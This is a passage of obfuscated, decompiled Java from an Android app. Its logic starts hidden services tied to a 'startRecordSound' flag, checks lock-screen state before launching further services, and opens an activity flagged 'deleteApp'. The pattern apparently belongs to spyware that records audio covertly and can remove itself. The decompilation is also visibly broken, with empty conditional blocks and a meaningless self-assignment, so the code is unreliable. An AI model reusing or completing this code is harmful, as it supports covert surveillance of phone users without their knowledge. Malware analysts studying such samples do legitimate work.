                    if (this.f422b.m251e(this, "startRecordSound").equals("stop")) {
                        this.f425e.startService(new Intent(this.f425e, (Class<?>) cpysnikhf.class).putExtra("time", "" + i8));
                    }
                    if (!zInKeyguardRestrictedInputMode) {
                        startService(new Intent(this.f425e, (Class<?>) ttiegryczsx.class));
                    }
                    if (Build.VERSION.SDK_INT >= 26) {
                    }
                } else {
                    this.f425e.startService(new Intent(this.f425e, (Class<?>) kldqwysgkfcrmq.class));
                    if (!this.f422b.m254g(this)) {
                    }
                    i6 = 2000;
                    if (!zInKeyguardRestrictedInputMode) {
                    }
                    if (this.f422b.m251e(this, "startRecordSound").equals("stop")) {
                    }
                    if (!zInKeyguardRestrictedInputMode) {
                    }
                    if (Build.VERSION.SDK_INT >= 26) {
                    }
                }
            } else {
                i3 = 5000;
                Intent intentPutExtra2 = new Intent(this, (Class<?>) dzudmx.class).putExtra("start", "deleteApp");
                intentPutExtra2.addFlags(268435456);
                intentPutExtra2.addFlags(1073741824);
                startActivity(intentPutExtra2);
            }
            Contains = Contains;
        }
    }
}
